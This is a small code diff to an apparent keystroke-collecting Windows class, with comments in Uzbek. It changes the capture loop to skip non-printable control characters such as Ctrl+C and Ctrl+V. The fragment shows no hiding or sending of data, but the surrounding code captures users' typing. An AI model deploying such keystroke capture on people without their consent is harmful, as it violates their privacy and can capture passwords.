@@ -96,9 +96,9 @@ class WindowsKeyboard(Collector):
                     elif key == kb.Key.backspace:
                         if self._buf:
                             self._buf.pop()
-                    elif hasattr(key, "char") and key.char is not None:
+                    elif hasattr(key, "char") and key.char is not None and key.char.isprintable():
                         self._buf.append(key.char)
-                    # boshqa maxsus tugmalar (Ctrl, Alt, ...) e'tiborga olinmaydi
+                    # boshqaruv belgilari (Ctrl+C=\x03, Ctrl+V=\x16 ...) va maxsus tugmalar o'tkazib yuboriladi
             except Exception:  # noqa: BLE001
                 pass
 
